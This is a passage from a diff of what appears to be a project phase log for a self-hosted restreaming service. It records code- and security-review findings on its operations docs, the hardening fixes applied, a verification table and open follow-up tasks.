+  (with -t 30 — S-8)` — `docker restart` has no inline `-t 30`. Replaced
+  with explicit `docker stop -t 30 … && docker start …`.
+- **M-1** `release-checklist.md` `gh run list --json conclusion,jobs`
+  schema doesn't include `jobs` at list level; jobs are a separate API
+  call. Rewrote with `gh run view --json jobs`.
+
+**security-reviewer** (4 high + 6 medium + 1 low):
+- **H-1** `backup-restore.md` restore-procedure named-volume branch
+  did `docker volume rm restream-data` with no rollback target. Added
+  pre-step that copies current volume into a snapshot
+  `restream-data.broken-${TS}` volume first (mirroring the bind-mount
+  `mv` semantics).
+- **H-2** `backup-restore.md` `docker cp` of `.kdf_salt` files didn't
+  preserve restrictive perms (the parent shell `umask 077` doesn't
+  apply to docker cp's output). Added explicit `chmod 0600` after each
+  `docker cp` and `install -d -m 0700` for the parent dir.
+- **H-3** `maintenance.md` log-redaction pipeline only matched
+  `/live/<key>` and `rtmps?://.../<key>`. Expanded with `?key=`,
+  `?token=`, `Authorization: Bearer`, and a blanket
+  `[A-Za-z0-9_-]{32,}` over-redaction; emphasized that the pipeline
+  is best-effort and manual review is the actual gate.
+- **H-4** `release-checklist.md` `gh release create … --notes-file …`
+  had no verification step before publishing. Added `shasum -a 256 …
+  && less …` instruction + a recommendation to commit release-notes
+  to a `docs/releases/` path so provenance is `git log` rather than
+  workstation state.
+- **M-1** `deployment.md` first-boot login over plain HTTP would
+  appear to conflict with `Secure` cookies; clarified that browsers
+  exempt `http://127.0.0.1` from the Secure-cookie restriction.
+- **M-2** `backup-restore.md` `docker logs -f` recommended without
+  redaction; switched to `--since 1m -f` plus a pointer to the
+  maintenance.md redaction pipeline.
+- **M-3** `deployment.md` TL;DR + "Protect the env file" used
+  `sudo tee <<'EOF'` heredocs that write the passphrase into the
+  operator's shell history. Switched to `sudoedit /etc/restream/env`
+  so the secret is typed into an editor buffer.
+- **M-4** `deployment.md` `openssl rand -hex 32` printed to the
+  terminal — scrollback / screenshare / `script` capture all retain
+  the value. Recommended piping directly to password-manager CLI
+  (`pass insert -m`, `wl-copy`, `pbcopy`); kept terminal-display form
+  as fallback only.
+- **M-5** `branch-protection.md` paired `required_approving_review_count=0`
+  with `enforce_admins=true` without acknowledging that no human
+  review happens (single-admin self-merge with green CI is the
+  designed-in property). Added "What this rule does NOT protect
+  against" subsection.
+- **M-6** `release-checklist.md` ffmpeg smoke command interpolated
+  the ingest key into argv (history + ps-visible). Switched to
+  `read -rs -p 'Ingest key (input hidden): ' INGEST_KEY` pattern,
+  with note that the URL still appears in ffmpeg's argv for its
+  lifetime and recommendation to rotate the ingest key after smoke
+  if workstation isn't trusted long-term.
+- **L-1** `maintenance.md` SQL inspection examples invited operator
+  to `SELECT *` on `credentials` / `api_tokens` while debugging.
+  Added explicit "Never `SELECT *`" warning.
+
+### Rule №5 audit — CLEAN
+
+17/17 claimed fixes grep-verified in code:
+
+| Fix | Verification |
+| --- | --- |
+| Busybox → docker exec sqlite3 (CR-C1) | 0 active `busybox sqlite3` references; only the comment explaining the swap ✓ |
+| Verify step expected output 0.0.0.0:1935 (CR-H1) | `LISTEN row on 0.0.0.0:1935` in deployment.md ✓ |
+| `env_file` path normalized to `/etc/restream/env` (CR-H2) | All 7+ occurrences across compose.yaml + deployment.md + upgrade.md + backup-restore.md use the same path ✓ |
+| Tag count 5 + :edge from build-image.yml (CR-H3) | "publish up to five tags from this workflow" + ":edge tag is published separately" in release-checklist.md ✓ |
+| `docker stop -t 30 && docker start` (CR-H4) | 2 hits in maintenance.md (the lockout entry + the log-rotation section) ✓ |
+| `gh run view --json jobs` (CR-M1) | `gh run view "$RUN_ID" --json jobs` in release-checklist.md step 2 ✓ |
+| Named-volume aside (SR-H1) | `restream-data.broken-${ASIDE_TS}` volume create + `cp -a /from/. /to/` in backup-restore.md ✓ |
+| `chmod 0600` on salt files (SR-H2) | 2 explicit chmod 0600 calls in backup-restore.md ✓ |
+| Expanded redaction pipeline (SR-H3) | `?key=`, `?token=`, `Authorization`, `[A-Za-z0-9_-]{32,}` patterns all present ✓ |
+| Release-notes verification step (SR-H4) | `shasum -a 256 release-notes-vX.Y.Z.md` + `less release-notes-vX.Y.Z.md` + `docs/releases/vX.Y.Z.md` alternative in release-checklist.md ✓ |
+| Loopback HTTP cookie exemption note (SR-M1) | "major browsers exempt `http://127.0.0.1` from the Secure-cookie restriction" in deployment.md TL;DR ✓ |
+| `docker logs --since 1m -f` (SR-M2) | backup-restore.md step 5 ✓ |
+| `sudoedit` instead of heredoc (SR-M3) | `sudoedit /etc/restream/env` in 2 places in deployment.md; no `tee <<'EOF'` with secret values ✓ |
+| `openssl rand` piped to password manager (SR-M4) | `pass insert -m`, `wl-copy`, `pbcopy` examples in deployment.md ✓ |
+| Self-merge acknowledgment (SR-M5) | "What this rule does NOT protect against" subsection in branch-protection.md ✓ |
+| `read -rs` for ingest key (SR-M6) | `read -rs -p 'Ingest key (input hidden):'` + "Rotate the ingest key after the smoke" in release-checklist.md ✓ |
+| Never `SELECT *` warning (SR-L1) | "Never `SELECT *` on `credentials` or `api_tokens`" in maintenance.md ✓ |
+
+Plus: all 30 design-memo invariants S-1..S-30 self-checked before
+reviewer spawn:
+- S-1 front-matter (7/7 docs).
+- S-3 + S-2 skeletons.
+- S-4 ports match `EXPOSE` in Dockerfile.
+- S-5 image tag table byte-identical in deployment.md + ghcr-retention.md.
+- S-6 env-var appendix matches `AppSettings` field list.
+- S-7 branch-protection check names match ci.yml job names.
+- S-8 no bare `docker stop` anywhere.
+- S-9 cosign command byte-identical in 3 docs.
+- S-10 no `--insecure-skip-verify` recommendations.
+- S-14 no `.first-boot-password` references as if the file existed.
+- S-16 `cp -r /data` only as DO-NOT example.
+- S-30 no "in v2" / "legacy" / "back-compat" language.
+
+### Concrete carryovers Phase 13+ may pick up
+
+1. **ADR-0005 admin-bootstrap autogen drift** (Phase 12 §N.a).
+   ADR-0005 §"Bootstrap" promises *"if [RESTREAM_ADMIN_PASSWORD is]
+   absent, generates a random 20-char passphrase and prints it to
+   stdout exactly once."* Shipping `app/db/schema_init.py` does NOT
+   implement this — if `RESTREAM_ADMIN_PASSWORD` is unset, the admin
+   row gets `password_hash=NULL`, `first_run_complete=0`, and the
+   operator cannot log in. Phase 12 docs document shipping reality
+   (env var required on first boot). Reconciliation in a follow-up
+   phase: either implement the autogen path in `_seed_initial_rows`
+   OR amend ADR-0005 §"Bootstrap" to match shipping. Either is
+   acceptable under Rule №2; not both.
+2. **Panel "test decrypt without revealing" affordance.** Restore
+   verification in `backup-restore.md` currently relies on "start a
+   brief test stream" as the end-to-end signal. A panel UI that
+   exposes per-credential "test decrypt OK / FAIL" without revealing
+   the key would make restore verification one click. Small Phase 13+
+   task; non-blocking.
+3. **Scheduled GHCR retention drift check.** A scheduled GHA workflow
+   that runs the `gh api` retention check nightly and opens an issue
+   on drift. Phase 13+ candidate.
+
+### Open follow-ups (carried from Phase 11)
+
+Same 4 items from Phases 9–10 still open (none touched by Phase 11
+or Phase 12):
+
+1. **first-run-complete auto-flip** in supervisor on first
+   successful `live` transition.
+2. **YouTube backup-ingest toggle** ("one target, two workers" model
+   change).
+3. **AuthReprompt grant-expired auto-retry** — one-shot retry wrapper.
+4. **HTTP sessions revoke reprompt** — needs `REVOKE_SESSION` scope.
+
+Plus Phase 11 → 12 carryovers (mostly Phase 13+ unless an incident
+triggers them sooner; logged in phase-11-design-memo.md §N):
+
+5. **Ingest-key leak CI smoke** — Phase 5 property test is the gate.
+6. **`NGINX_RTMP_MODULE_TREE_SHA`** git-tree-hash defense.
+7. **GPG verify nginx tarball** as CI gate (currently manual).
+8. **arm64 runtime smoke under qemu fallback** — only relevant if
+   `ubuntu-24.04-arm` runner availability degrades.
+9. **Renovate self-hosted script-pin gate** — only relevant if
+   self-hosted Renovate is adopted.
 
 ---
 
